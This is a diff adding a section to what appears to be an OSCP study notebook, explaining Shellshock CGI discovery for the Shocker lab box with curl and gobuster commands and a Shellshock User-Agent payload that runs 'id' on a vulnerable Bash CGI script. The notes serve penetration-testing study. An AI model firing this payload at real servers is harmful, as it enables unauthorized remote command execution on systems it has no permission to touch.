@@ -165,6 +165,33 @@ CVSS v3.0 Temporal Vector: CVSS:3.0/E:F/RL:O/RC:C
 🔁 **Seen in:** [[07. Vulnerability Scanning#7.2.4. Analyzing the Results|Vulnerability Scanning, 7.2.4]].
 
 #### Tags: #Nessus #CVSS #TemporalVector #ExploitCodeMaturity #CommandBreakdowns
+## Shellshock CGI discovery: why a forbidden directory can still leak a script
+
+**Full commands:**
+
+~~~bash
+curl -si "http://$BoxIP:$WebPort/cgi-bin/"
+
+gobuster dir -u "http://$BoxIP:$WebPort/cgi-bin/" \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -x sh,cgi,pl,py \
+  -o "$BoxDir/loot/gobuster-cgi.txt"
+
+curl -si "http://$BoxIP:$WebPort/cgi-bin/$Script" \
+  -H 'User-Agent: () { :; }; echo; echo; /usr/bin/id'
+~~~
+
+**Piece by piece:**
+
+- The CGI directory request checks whether the server exposes a directory listing. A 403 means listing is forbidden, not that every child path is denied.
+- The second request makes the content scanner treat /cgi-bin/ as its own wordlist root. The extension list increases the chance of finding scripts that are not linked from the home page.
+- The final request sends a function-style User-Agent value and appends id. On a vulnerable Bash CGI path, the uid line is the proof that the header reached command execution.
+- The identity proof is deliberately harmless. A positive proof lets callback failures be debugged as listener, route, port, or quoting issues.
+
+**Seen in:** [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]].
+
+#### Tags: #Shellshock #CGI #Gobuster #Apache #CommandBreakdowns
+
 ## External Resources
 
 - [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
